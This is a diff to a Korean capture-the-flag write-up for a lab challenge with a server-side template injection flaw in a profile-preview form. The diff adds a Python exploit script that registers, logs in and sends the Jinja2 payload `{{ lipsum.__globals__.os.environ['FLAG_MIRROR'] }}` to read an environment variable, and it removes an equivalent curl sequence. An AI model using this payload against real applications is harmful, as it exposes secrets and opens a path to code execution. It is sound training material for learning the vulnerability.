@@ -153,22 +153,43 @@ def preview():
 | SSTI 확인 | `{{ 7*7 }}` → 미리보기에 `49` |
 | 플래그 획득 | `{{ lipsum.__globals__.os.environ['FLAG_MIRROR'] }}` → 미리보기에 플래그 |
 
-### CLI로 재현 (선택)
+### 스크립트로 재현
 
-로그인 세션 쿠키를 받아 미리보기 요청에 그대로 쓴다.
+로그인한 세션으로 미리보기 요청을 보낸다.
+
+```python
+#!/usr/bin/env python3
+# medium-04 (자기소개 미리보기 / SSTI) - 미리보기에 템플릿 식을 넣어 환경변수의 플래그 읽기
+# 사용: python3 exploit.py http://<IP>:8006
+import re
+import sys
+import requests
+
+BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:8006"
+USER, PW = "hacker01", "pw123456"
+
+s = requests.Session()  # 세션 쿠키(gh_8006) 자동 관리
+
+# 0) 회원가입 + 로그인
+s.post(f"{BASE}/signup", data={"username": USER, "password": PW, "password_confirm": PW,
+                               "name": "tester", "email": "a@a.com"})
+s.post(f"{BASE}/login", data={"username": USER, "password": PW})
+
+# 1) SSTI 확인: {{ 7*7 }} 이 49 로 나오면 템플릿으로 해석되는 것
+r = s.post(f"{BASE}/apply/preview", data={"intro": "{{ 7*7 }}"})
+print(f"[*] {{{{ 7*7 }}}} -> {'49' if '49' in r.text else '해석 안 됨'}")
+
+# 2) lipsum 의 전역에서 os 모듈에 닿아 환경변수의 플래그를 읽는다
+r = s.post(f"{BASE}/apply/preview",
+           data={"intro": "{{ lipsum.__globals__.os.environ['FLAG_MIRROR'] }}"})
+m = re.search(r"GlassHouse\{[^}]*\}", r.text)
+print(f"[+] FLAG: {m.group(0)}" if m else "[-] 실패")
+```
+
+실행 예시
 
 ```bash
-B=http://127.0.0.1:8006
-
-# 1) 회원가입 → 로그인(세션 쿠키 저장)
-curl -s --data-urlencode "username=hacker01" --data-urlencode "password=pw123456" \
-     --data-urlencode "password_confirm=pw123456" --data-urlencode "name=tester" \
-     --data-urlencode "email=a@a.com" "$B/signup" >/dev/null
-curl -s -c c.txt --data-urlencode "username=hacker01" \
-     --data-urlencode "password=pw123456" "$B/login" >/dev/null
-
-# 2) 미리보기에 SSTI 페이로드 전송 → 플래그 추출
-curl -s -b c.txt \
-     --data-urlencode "intro={{ lipsum.__globals__.os.environ['FLAG_MIRROR'] }}" \
-     "$B/apply/preview" | grep -o "GlassHouse{[^}]*}"
+$ python3 exploit.py http://127.0.0.1:8006
+[*] {{ 7*7 }} -> 49
+[+] FLAG: GlassHouse{...}
 ```
